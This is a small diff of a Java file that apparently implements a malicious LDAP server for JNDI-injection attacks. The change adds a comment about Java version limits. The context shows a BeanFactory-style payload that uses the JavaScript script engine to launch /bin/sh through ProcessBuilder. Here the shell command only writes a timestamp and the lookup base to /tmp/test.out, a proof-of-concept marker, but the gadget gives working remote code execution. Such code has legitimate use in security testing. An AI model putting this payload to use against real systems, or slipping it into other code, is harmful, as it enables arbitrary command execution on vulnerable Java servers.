@@ -83,6 +83,7 @@ public class Application {
         protected void sendResultBeanFactory(InMemoryInterceptedSearchResult result, String base, Entry entry) throws LDAPException {
             logger.info("sendResultBeanFactory: Send LDAP reference result for '{}'", base);
 
+            // 'getEngineByName("JavaScript")' only works up to Java 14
             String payload = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                     ".newInstance().getEngineByName(\"JavaScript\")" +
                     ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','DATE=`/bin/date`; echo \\\"$DATE: " + base + "\\\" >> /tmp/test.out']).start()\")";
